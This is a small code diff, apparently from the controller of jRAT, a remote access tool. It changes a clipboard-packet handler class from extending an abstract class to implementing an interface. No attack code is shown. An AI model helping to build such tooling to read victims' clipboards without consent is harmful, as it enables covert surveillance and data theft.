@@ -5,7 +5,7 @@ import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlClipboard;
 
 
-public class Packet41Clipboard extends AbstractIncomingPacket {
+public class Packet41Clipboard implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
